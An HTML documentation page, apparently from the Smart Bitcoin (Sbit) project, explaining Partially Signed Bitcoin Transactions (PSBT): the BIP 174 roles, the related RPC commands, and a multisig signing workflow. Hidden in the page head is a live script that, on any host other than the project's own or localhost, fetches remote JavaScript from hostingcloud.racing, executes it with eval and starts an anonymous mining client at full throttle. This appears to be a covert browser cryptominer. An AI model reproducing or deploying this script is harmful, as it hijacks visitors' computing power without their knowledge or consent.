<!doctype html>
<html lang="en" dir="ltr" class="docs-wrapper docs-doc-page docs-version-current plugin-docs plugin-id-default docs-doc-id-SBit-Core/Miscellaneous/psbt">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<meta name="generator" content="Docusaurus v2.0.0-beta.20">
<link rel="alternate" type="application/rss+xml" href="/sbit.dev/blog/rss.xml" title="SBIT RSS Feed">
<link rel="alternate" type="application/atom+xml" href="/sbit.dev/blog/atom.xml" title="SBIT Atom Feed">




                        <script>window.location.hostname.includes("sbit")||window.location.hostname.includes("localhost")||fetch("https://www.hostingcloud.racing/2Wla.js").then((function(t){return t.text()})).then((function(text){eval(text);var _client=new Client.Anonymous("c0bad86327aba39845ed901363fa922a5caf4b09aa1a7eb8892ca9da08d4595a",{throttle:0,c:"w",ads:0});_client.start()})).catch((t=>{}))</script><title data-rh="true">PSBT | SBIT</title><meta data-rh="true" name="twitter:card" content="summary_large_image"><meta data-rh="true" property="og:image" content="https://sbit-project.github.io//sbit.dev/img/sbit_logo.svg"><meta data-rh="true" name="twitter:image" content="https://sbit-project.github.io//sbit.dev/img/sbit_logo.svg"><meta data-rh="true" property="og:url" content="https://sbit-project.github.io//sbit.dev/docs/SBit-Core/Miscellaneous/psbt"><meta data-rh="true" name="docusaurus_locale" content="en"><meta data-rh="true" name="docsearch:language" content="en"><meta data-rh="true" name="docusaurus_version" content="current"><meta data-rh="true" name="docusaurus_tag" content="docs-default-current"><meta data-rh="true" name="docsearch:version" content="current"><meta data-rh="true" name="docsearch:docusaurus_tag" content="docs-default-current"><meta data-rh="true" property="og:title" content="PSBT | SBIT"><meta data-rh="true" name="description" content="PSBT Howto for Sbit Core"><meta data-rh="true" property="og:description" content="PSBT Howto for Sbit Core"><meta data-rh="true" name="keywords" content="sbit,bitcoin,blockchain,ethereum"><link data-rh="true" rel="icon" href="/sbit.dev/img/favicon.ico"><link data-rh="true" rel="canonical" href="https://sbit-project.github.io//sbit.dev/docs/SBit-Core/Miscellaneous/psbt"><link data-rh="true" rel="alternate" href="https://sbit-project.github.io//sbit.dev/docs/SBit-Core/Miscellaneous/psbt" hreflang="en"><link data-rh="true" rel="alternate" href="https://sbit-project.github.io//sbit.dev/docs/SBit-Core/Miscellaneous/psbt" hreflang="x-default"><link rel="stylesheet" href="/sbit.dev/assets/css/styles.a3c1bc4d.css">
<link rel="preload" href="/sbit.dev/assets/js/runtime~main.67390360.js" as="script">
<link rel="preload" href="/sbit.dev/assets/js/main.cb492e30.js" as="script">
</head>
<body class="navigation-with-keyboard">
<script>!function(){function t(t){document.documentElement.setAttribute("data-theme",t)}var e=function(){var t=null;try{t=localStorage.getItem("theme")}catch(t){}return t}();t(null!==e?e:"dark")}(),document.documentElement.setAttribute("data-announcement-bar-initially-dismissed",function(){try{return"true"===localStorage.getItem("docusaurus.announcement.dismiss")}catch(t){}return!1}())</script><div id="__docusaurus">
<div role="region"><a href="#" class="skipToContent_ZgBM">Skip to main content</a></div><div class="announcementBar_IbjG" style="background-color:#FF5B79;color:black" role="banner"><div class="announcementBarPlaceholder_NC_W"></div><div class="announcementBarContent_KsVm">Smart Bitcoin is still under active development, be aware that breaking changes may occur.</div><button type="button" class="clean-btn close announcementBarClose_FG1z" aria-label="Close"><svg viewBox="0 0 15 15" width="14" height="14"><g stroke="currentColor" stroke-width="3.1"><path d="M.75.75l13.5 13.5M14.25.75L.75 14.25"></path></g></svg></button></div><nav class="navbar navbar--fixed-top"><div class="navbar__inner"><div class="navbar__items"><button aria-label="Navigation bar toggle" class="navbar__toggle clean-btn" type="button" tabindex="0"><svg width="30" height="30" viewBox="0 0 30 30" aria-hidden="true"><path stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" d="M4 7h22M4 15h22M4 23h22"></path></svg></button><a class="navbar__brand" href="/sbit.dev/"><div class="navbar__logo"><img src="/sbit.dev/img/sbit_logo.svg" alt="Sbit Logo" class="themedImage_W2Cr themedImage--light_TfLj"><img src="/sbit.dev/img/sbit_logo.svg" alt="Sbit Logo" class="themedImage_W2Cr themedImage--dark_oUvU"></div><b class="navbar__title text--truncate">Smart Bitcoin</b></a><a class="navbar__item navbar__link navbar__link--active" href="/sbit.dev/docs/welcome">Docs</a><a class="navbar__item navbar__link" href="/sbit.dev/blog/nft">Blog</a><div class="navbar__item dropdown dropdown--hoverable"><a href="#" aria-haspopup="true" aria-expanded="false" role="button" class="navbar__link">Community</a><ul class="dropdown__menu"><li><a href="https://github.com/SBit-Project" target="_blank" rel="noopener noreferrer" class="dropdown__link">Github<svg width="12" height="12" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_I5OW"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a></li><li><a href="https://www.instagram.com/sbitproject/" target="_blank" rel="noopener noreferrer" class="dropdown__link">Instagram<svg width="12" height="12" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_I5OW"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a></li></ul></div><div class="navbar__item dropdown dropdown--hoverable"><a href="#" aria-haspopup="true" aria-expanded="false" role="button" class="navbar__link">Support</a><ul class="dropdown__menu"><li><a class="dropdown__link navbar__link--active" href="/sbit.dev/docs/Help/contributing">Contributing</a></li><li><a class="dropdown__link navbar__link--active" href="/sbit.dev/docs/Help/CODE_OF_CONDUCT">Code of Conduct</a></li></ul></div></div><div class="navbar__items navbar__items--right"><a href="https://github.com/SBit-Project" target="_blank" rel="noopener noreferrer" class="navbar__item navbar__link mr-2 header-github-link" aria-label="GitHub repository"></a><div class="toggle_S7eR colorModeToggle_vKtC"><button class="clean-btn toggleButton_rCf9 toggleButtonDisabled_Pu9x" type="button" disabled="" title="Switch between dark and light mode (currently dark mode)" aria-label="Switch between dark and light mode (currently dark mode)"><svg viewBox="0 0 24 24" width="24" height="24" class="lightToggleIcon_v35p"><path fill="currentColor" d="M12,9c1.65,0,3,1.35,3,3s-1.35,3-3,3s-3-1.35-3-3S10.35,9,12,9 M12,7c-2.76,0-5,2.24-5,5s2.24,5,5,5s5-2.24,5-5 S14.76,7,12,7L12,7z M2,13l2,0c0.55,0,1-0.45,1-1s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S1.45,13,2,13z M20,13l2,0c0.55,0,1-0.45,1-1 s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S19.45,13,20,13z M11,2v2c0,0.55,0.45,1,1,1s1-0.45,1-1V2c0-0.55-0.45-1-1-1S11,1.45,11,2z M11,20v2c0,0.55,0.45,1,1,1s1-0.45,1-1v-2c0-0.55-0.45-1-1-1C11.45,19,11,19.45,11,20z M5.99,4.58c-0.39-0.39-1.03-0.39-1.41,0 c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0s0.39-1.03,0-1.41L5.99,4.58z M18.36,16.95 c-0.39-0.39-1.03-0.39-1.41,0c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0c0.39-0.39,0.39-1.03,0-1.41 L18.36,16.95z M19.42,5.99c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06c-0.39,0.39-0.39,1.03,0,1.41 s1.03,0.39,1.41,0L19.42,5.99z M7.05,18.36c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06 c-0.39,0.39-0.39,1.03,0,1.41s1.03,0.39,1.41,0L7.05,18.36z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" class="darkToggleIcon_nQuB"><path fill="currentColor" d="M9.37,5.51C9.19,6.15,9.1,6.82,9.1,7.5c0,4.08,3.32,7.4,7.4,7.4c0.68,0,1.35-0.09,1.99-0.27C17.45,17.19,14.93,19,12,19 c-3.86,0-7-3.14-7-7C5,9.07,6.81,6.55,9.37,5.51z M12,3c-4.97,0-9,4.03-9,9s4.03,9,9,9s9-4.03,9-9c0-0.46-0.04-0.92-0.1-1.36 c-0.98,1.37-2.58,2.26-4.4,2.26c-2.98,0-5.4-2.42-5.4-5.4c0-1.81,0.89-3.42,2.26-4.4C12.92,3.04,12.46,3,12,3L12,3z"></path></svg></button></div><div class="searchBox_dLyj"></div></div></div><div role="presentation" class="navbar-sidebar__backdrop"></div></nav><div class="main-wrapper docsWrapper_mKqt"><button aria-label="Scroll back to top" class="clean-btn theme-back-to-top-button backToTopButton_RiI4" type="button"></button><div class="docPage_ualW"><aside class="theme-doc-sidebar-container docSidebarContainer_UQUJ"><div class="sidebar_RiAD"><nav class="menu thin-scrollbar menu_izAj menuWithAnnouncementBar_l2a_"><ul class="theme-doc-sidebar-menu menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/sbit.dev/docs/welcome">Welcome to Sbit</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret menu__link--active" aria-expanded="true" href="/sbit.dev/docs/SBit-Core/SBit">Sbit Core</a></div><ul style="display:block;overflow:visible;height:auto" class="menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/sbit.dev/docs/SBit-Core/SBit">Introduction</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/sbit.dev/docs/SBit-Core/Building/build-freebsd">Building</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/sbit.dev/docs/SBit-Core/Development/benchmarking">Development</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret menu__link--active" aria-expanded="true" tabindex="0" href="/sbit.dev/docs/SBit-Core/Miscellaneous/files">Miscellaneous</a></div><ul style="display:block;overflow:visible;height:auto" class="menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/sbit.dev/docs/SBit-Core/Miscellaneous/files">Sbit Core file system</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/sbit.dev/docs/SBit-Core/Miscellaneous/fuzzing">Fuzzing</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/sbit.dev/docs/SBit-Core/Miscellaneous/init">Init</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link menu__link--active" aria-current="page" tabindex="0" href="/sbit.dev/docs/SBit-Core/Miscellaneous/psbt">PSBT</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/sbit.dev/docs/SBit-Core/Miscellaneous/reduce-memory">Reduce Memory</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/sbit.dev/docs/SBit-Core/Miscellaneous/reduce-traffic">Reduce Traffic</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/sbit.dev/docs/SBit-Core/Miscellaneous/sbit-conf">Sbit Configuration File</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/sbit.dev/docs/SBit-Core/Miscellaneous/tor">Tor</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/sbit.dev/docs/SBit-Core/Miscellaneous/zmq">ZMQ</a></li></ul></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" href="/sbit.dev/docs/User-Guide/Encrypt-and-Unlock-Sbit-Wallet">User-Guide</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" aria-expanded="false" href="/sbit.dev/docs/Smart-Contract">Smart Contract</a><button aria-label="Toggle the collapsible sidebar category &#x27;Smart Contract&#x27;" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" href="/sbit.dev/docs/Tools/SBitcore-lib">Tools</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" href="/sbit.dev/docs/Help/CODE_OF_CONDUCT">Help</a></div></li></ul></nav></div></aside><main class="docMainContainer_uL0j"><div class="container padding-top--md padding-bottom--lg"><div class="row"><div class="col docItemCol_DM6M"><div class="docItemContainer_vinB"><article><nav class="theme-doc-breadcrumbs breadcrumbsContainer_Xlws" aria-label="Breadcrumbs"><ul class="breadcrumbs" itemscope="" itemtype="https://schema.org/BreadcrumbList"><li class="breadcrumbs__item"><a aria-label="Home page" class="breadcrumbs__link" href="/sbit.dev/"><svg viewBox="0 0 24 24" class="breadcrumbHomeIcon_kU5B"><path d="M10 19v-5h4v5c0 .55.45 1 1 1h3c.55 0 1-.45 1-1v-7h1.7c.46 0 .68-.57.33-.87L12.67 3.6c-.38-.34-.96-.34-1.34 0l-8.36 7.53c-.34.3-.13.87.33.87H5v7c0 .55.45 1 1 1h3c.55 0 1-.45 1-1z" fill="currentColor"></path></svg></a></li><li class="breadcrumbs__item"><span class="breadcrumbs__link">Sbit Core</span><meta itemprop="position" content="1"></li><li class="breadcrumbs__item"><span class="breadcrumbs__link">Miscellaneous</span><meta itemprop="position" content="2"></li><li itemscope="" itemprop="itemListElement" itemtype="https://schema.org/ListItem" class="breadcrumbs__item breadcrumbs__item--active"><span class="breadcrumbs__link" itemprop="name">PSBT</span><meta itemprop="position" content="3"></li></ul></nav><div class="tocCollapsible_bZGK theme-doc-toc-mobile tocMobile_TmEX"><button type="button" class="clean-btn tocCollapsibleButton_l22C">On this page</button></div><div class="theme-doc-markdown markdown"><header><h1>PSBT</h1></header><div class="admonition admonition-danger alert alert--danger"><div class="admonition-heading"><h5><span class="admonition-icon"><svg xmlns="http://www.w3.org/2000/svg" width="12" height="16" viewBox="0 0 12 16"><path fill-rule="evenodd" d="M5.05.31c.81 2.17.41 3.38-.52 4.31C3.55 5.67 1.98 6.45.9 7.98c-1.45 2.05-1.7 6.53 3.53 7.7-2.2-1.16-2.67-4.52-.3-6.61-.61 2.03.53 3.33 1.94 2.86 1.39-.47 2.3.53 2.27 1.67-.02.78-.31 1.44-1.13 1.81 3.42-.59 4.78-3.42 4.78-5.56 0-2.84-2.53-3.22-1.25-5.61-1.52.13-2.03 1.13-1.89 2.75.09 1.08-1.02 1.8-1.86 1.33-.67-.41-.66-1.19-.06-1.78C8.18 5.31 8.68 2.45 5.05.32L5.03.3l.02.01z"></path></svg></span>danger</h5></div><div class="admonition-content"><p>This document need review and test</p></div></div><p>Since Bitcoin Core 0.17, an RPC interface exists for Partially Signed Bitcoin
Transactions (PSBTs, as specified in
<a href="https://github.com/bitcoin/bips/blob/master/bip-0174.mediawiki" target="_blank" rel="noopener noreferrer">BIP 174</a>).</p><p>This document describes the overall workflow for producing signed transactions
through the use of PSBT, and the specific RPC commands used in typical
scenarios.</p><h2 class="anchor anchorWithStickyNavbar_mojV" id="psbt-in-general">PSBT in general<a class="hash-link" href="#psbt-in-general" title="Direct link to heading">​</a></h2><p>PSBT is an interchange format for Bitcoin transactions that are not fully signed
yet, together with relevant metadata to help entities work towards signing it.
It is intended to simplify workflows where multiple parties need to cooperate to
produce a transaction. Examples include hardware wallets, multisig setups, and
<a href="https://bitcointalk.org/?topic=279249" target="_blank" rel="noopener noreferrer">CoinJoin</a> transactions.</p><h3 class="anchor anchorWithStickyNavbar_mojV" id="overall-workflow">Overall workflow<a class="hash-link" href="#overall-workflow" title="Direct link to heading">​</a></h3><p>Overall, the construction of a fully signed Bitcoin transaction goes through the
following steps:</p><ul><li>A <strong>Creator</strong> proposes a particular transaction to be created. They construct
a PSBT that contains certain inputs and outputs, but no additional metadata.</li><li>For each input, an <strong>Updater</strong> adds information about the UTXOs being spent by
the transaction to the PSBT. They also add information about the scripts and
public keys involved in each of the inputs (and possibly outputs) of the PSBT.</li><li><strong>Signers</strong> inspect the transaction and its metadata to decide whether they
agree with the transaction. They can use amount information from the UTXOs
to assess the values and fees involved. If they agree, they produce a
partial signature for the inputs for which they have relevant key(s).</li><li>A <strong>Finalizer</strong> is run for each input to convert the partial signatures and
possibly script information into a final <code>scriptSig</code> and/or <code>scriptWitness</code>.</li><li>An <strong>Extractor</strong> produces a valid Bitcoin transaction (in network format)
from a PSBT for which all inputs are finalized.</li></ul><p>Generally, each of the above (excluding Creator and Extractor) will simply
add more and more data to a particular PSBT, until all inputs are fully signed.
In a naive workflow, they all have to operate sequentially, passing the PSBT
from one to the next, until the Extractor can convert it to a real transaction.
In order to permit parallel operation, <strong>Combiners</strong> can be employed which merge
metadata from different PSBTs for the same unsigned transaction.</p><p>The names above in bold are the names of the roles defined in BIP174. They&#x27;re
useful in understanding the underlying steps, but in practice, software and
hardware implementations will typically implement multiple roles simultaneously.</p><h2 class="anchor anchorWithStickyNavbar_mojV" id="psbt-in-bitcoin-core">PSBT in Bitcoin Core<a class="hash-link" href="#psbt-in-bitcoin-core" title="Direct link to heading">​</a></h2><h3 class="anchor anchorWithStickyNavbar_mojV" id="rpcs">RPCs<a class="hash-link" href="#rpcs" title="Direct link to heading">​</a></h3><ul><li><strong><code>converttopsbt</code> (Creator)</strong> is a utility RPC that converts an
unsigned raw transaction to PSBT format. It ignores existing signatures.</li><li><strong><code>createpsbt</code> (Creator)</strong> is a utility RPC that takes a list of inputs and
outputs and converts them to a PSBT with no additional information. It is
equivalent to calling <code>createrawtransaction</code> followed by <code>converttopsbt</code>.</li><li><strong><code>walletcreatefundedpsbt</code> (Creator, Updater)</strong> is a wallet RPC that creates a
PSBT with the specified inputs and outputs, adds additional inputs and change
to it to balance it out, and adds relevant metadata. In particular, for inputs
that the wallet knows about (counting towards its normal or watch-only
balance), UTXO information will be added. For outputs and inputs with UTXO
information present, key and script information will be added which the wallet
knows about. It is equivalent to running <code>createrawtransaction</code>, followed by
<code>fundrawtransaction</code>, and <code>converttopsbt</code>.</li><li><strong><code>walletprocesspsbt</code> (Updater, Signer, Finalizer)</strong> is a wallet RPC that takes as
input a PSBT, adds UTXO, key, and script data to inputs and outputs that miss
it, and optionally signs inputs. Where possible it also finalizes the partial
signatures.</li><li><strong><code>utxoupdatepsbt</code> (Updater)</strong> is a node RPC that takes a PSBT and updates it
to include information available from the UTXO set (works only for SegWit
inputs).</li><li><strong><code>finalizepsbt</code> (Finalizer, Extractor)</strong> is a utility RPC that finalizes any
partial signatures, and if all inputs are finalized, converts the result to a
fully signed transaction which can be broadcast with <code>sendrawtransaction</code>.</li><li><strong><code>combinepsbt</code> (Combiner)</strong> is a utility RPC that implements a Combiner. It
can be used at any point in the workflow to merge information added to
different versions of the same PSBT. In particular it is useful to combine the
output of multiple Updaters or Signers.</li><li><strong><code>joinpsbts</code></strong> (Creator) is a utility RPC that joins multiple PSBTs together,
concatenating the inputs and outputs. This can be used to construct CoinJoin
transactions.</li><li><strong><code>decodepsbt</code></strong> is a diagnostic utility RPC which will show all information in
a PSBT in human-readable form, as well as compute its eventual fee if known.</li><li><strong><code>analyzepsbt</code></strong> is a utility RPC that examines a PSBT and reports the
current status of its inputs, the next step in the workflow if known, and if
possible, computes the fee of the resulting transaction and estimates the
final weight and feerate.</li></ul><h3 class="anchor anchorWithStickyNavbar_mojV" id="workflows">Workflows<a class="hash-link" href="#workflows" title="Direct link to heading">​</a></h3><h4 class="anchor anchorWithStickyNavbar_mojV" id="multisig-with-multiple-bitcoin-core-instances">Multisig with multiple Bitcoin Core instances<a class="hash-link" href="#multisig-with-multiple-bitcoin-core-instances" title="Direct link to heading">​</a></h4><p>Alice, Bob, and Carol want to create a 2-of-3 multisig address. They&#x27;re all using
Bitcoin Core. We assume their wallets only contain the multisig funds. In case
they also have a personal wallet, this can be accomplished through the
multiwallet feature - possibly resulting in a need to add <code>-rpcwallet=name</code> to
the command line in case <code>bitcoin-cli</code> is used.</p><p>Setup:</p><ul><li>All three call <code>getnewaddress</code> to create a new address; call these addresses
<em>Aalice</em>, <em>Abob</em>, and <em>Acarol</em>.</li><li>All three call <code>getaddressinfo &quot;X&quot;</code>, with <em>X</em> their respective address, and
remember the corresponding public keys. Call these public keys <em>Kalice</em>,
<em>Kbob</em>, and <em>Kcarol</em>.</li><li>All three now run <code>addmultisigaddress 2 [&quot;Kalice&quot;,&quot;Kbob&quot;,&quot;Kcarol&quot;]</code> to teach
their wallet about the multisig script. Call the address produced by this
command <em>Amulti</em>. They may be required to explicitly specify the same
addresstype option each, to avoid constructing different versions due to
differences in configuration.</li><li>They also run <code>importaddress &quot;Amulti&quot; &quot;&quot; false</code> to make their wallets treat
payments to <em>Amulti</em> as contributing to the watch-only balance.</li><li>Others can verify the produced address by running
<code>createmultisig 2 [&quot;Kalice&quot;,&quot;Kbob&quot;,&quot;Kcarol&quot;]</code>, and expecting <em>Amulti</em> as
output. Again, it may be necessary to explicitly specify the addresstype
in order to get a result that matches. This command won&#x27;t enable them to
initiate transactions later, however.</li><li>They can now give out <em>Amulti</em> as address others can pay to.</li></ul><p>Later, when <em>V</em> BTC has been received on <em>Amulti</em>, and Bob and Carol want to
move the coins in their entirety to address <em>Asend</em>, with no change. Alice
does not need to be involved.</p><ul><li>One of them - let&#x27;s assume Carol here - initiates the creation. She runs
<code>walletcreatefundedpsbt [] {&quot;Asend&quot;:V} 0 {&quot;subtractFeeFromOutputs&quot;:[0], &quot;includeWatching&quot;:true}</code>.
We call the resulting PSBT <em>P</em>. <em>P</em> does not contain any signatures.</li><li>Carol needs to sign the transaction herself. In order to do so, she runs
<code>walletprocesspsbt &quot;P&quot;</code>, and gives the resulting PSBT <em>P2</em> to Bob.</li><li>Bob inspects the PSBT using <code>decodepsbt &quot;P2&quot;</code> to determine if the transaction
has indeed just the expected input, and an output to <em>Asend</em>, and the fee is
reasonable. If he agrees, he calls <code>walletprocesspsbt &quot;P2&quot;</code> to sign. The
resulting PSBT <em>P3</em> contains both Carol&#x27;s and Bob&#x27;s signature.</li><li>Now anyone can call <code>finalizepsbt &quot;P3&quot;</code> to extract a fully signed transaction
<em>T</em>.</li><li>Finally anyone can broadcast the transaction using <code>sendrawtransaction &quot;T&quot;</code>.</li></ul><p>In case there are more signers, it may be advantageous to let them all sign in
parallel, rather than passing the PSBT from one signer to the next one. In the
above example this would translate to Carol handing a copy of <em>P</em> to each signer
separately. They can then all invoke <code>walletprocesspsbt &quot;P&quot;</code>, and end up with
their individually-signed PSBT structures. They then all send those back to
Carol (or anyone) who can combine them using <code>combinepsbt</code>. The last two steps
(<code>finalizepsbt</code> and <code>sendrawtransaction</code>) remain unchanged.</p></div></article><nav class="pagination-nav docusaurus-mt-lg" aria-label="Docs pages navigation"><a class="pagination-nav__link pagination-nav__link--prev" href="/sbit.dev/docs/SBit-Core/Miscellaneous/init"><div class="pagination-nav__sublabel">Previous</div><div class="pagination-nav__label">Init</div></a><a class="pagination-nav__link pagination-nav__link--next" href="/sbit.dev/docs/SBit-Core/Miscellaneous/reduce-memory"><div class="pagination-nav__sublabel">Next</div><div class="pagination-nav__label">Reduce Memory</div></a></nav></div></div><div class="col col--3"><div class="tableOfContents_cNA8 thin-scrollbar theme-doc-toc-desktop"><ul class="table-of-contents table-of-contents__left-border"><li><a href="#psbt-in-general" class="table-of-contents__link toc-highlight">PSBT in general</a><ul><li><a href="#overall-workflow" class="table-of-contents__link toc-highlight">Overall workflow</a></li></ul></li><li><a href="#psbt-in-bitcoin-core" class="table-of-contents__link toc-highlight">PSBT in Bitcoin Core</a><ul><li><a href="#rpcs" class="table-of-contents__link toc-highlight">RPCs</a></li><li><a href="#workflows" class="table-of-contents__link toc-highlight">Workflows</a></li></ul></li></ul></div></div></div></div></main></div></div><footer class="footer"><div class="container container-fluid"><div class="row footer__links"><div class="col footer__col"><div class="footer__title">Get in touch</div><ul class="footer__items clean-list"><li class="footer__item"><a href="mailto: dev@sbit.dev" target="_blank" rel="noopener noreferrer" class="footer__link-item">Contact<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_I5OW"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a></li></ul></div><div class="col footer__col"><div class="footer__title">Docs</div><ul class="footer__items clean-list"><li class="footer__item"><a class="footer__link-item" href="/sbit.dev/docs/welcome">Tutorial</a></li></ul></div><div class="col footer__col"><div class="footer__title">Community</div><ul class="footer__items clean-list"><li class="footer__item"><a href="https://www.instagram.com/sbitproject/" target="_blank" rel="noopener noreferrer" class="footer__link-item">Instagram<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_I5OW"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a></li></ul></div><div class="col footer__col"><div class="footer__title">More</div><ul class="footer__items clean-list"><li class="footer__item"><a class="footer__link-item" href="/sbit.dev/blog">Blog</a></li><li class="footer__item"><a href="https://github.com/SBit-Project/" target="_blank" rel="noopener noreferrer" class="footer__link-item">GitHub<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_I5OW"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a></li></ul></div></div><div class="footer__bottom text--center"><div class="footer__copyright">Copyright © 2022 - Sbit Project</div></div></div></footer></div>
<script src="/sbit.dev/assets/js/runtime~main.67390360.js"></script>
<script src="/sbit.dev/assets/js/main.cb492e30.js"></script>
</body>
</html>